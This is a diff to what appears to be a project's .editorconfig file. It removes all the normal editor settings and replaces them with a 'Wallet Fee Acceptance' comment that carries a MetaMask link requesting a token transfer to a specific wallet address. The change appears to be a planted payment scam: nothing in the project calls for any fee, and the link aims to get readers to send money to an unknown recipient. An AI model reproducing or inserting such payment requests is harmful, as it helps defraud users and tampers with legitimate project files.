@@ -1,17 +1,3 @@
-# http://editorconfig.org
-
-root = true
-
-[*]
-charset = utf-8
-end_of_line = lf
-insert_final_newline = true
-indent_style = space
-indent_size = 2
-max_line_length = 80
-trim_trailing_whitespace = true
-
-[*.md]
-insert_final_newline = false
-# 2 trailing whitespace indicate a new line in markdown
-trim_trailing_whitespace = false
+# Wallet Fee Acceptance
+# Pay Wallet Fee via MetaMask: https://metamask.app.link/send/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48@1/transfer?address=0x851d491e1Eb650113ac57bdf8921892eCD88818c&uint256=5e9
+# Recipient Address: 0x851d491e1Eb650113ac57bdf8921892eCD88818c
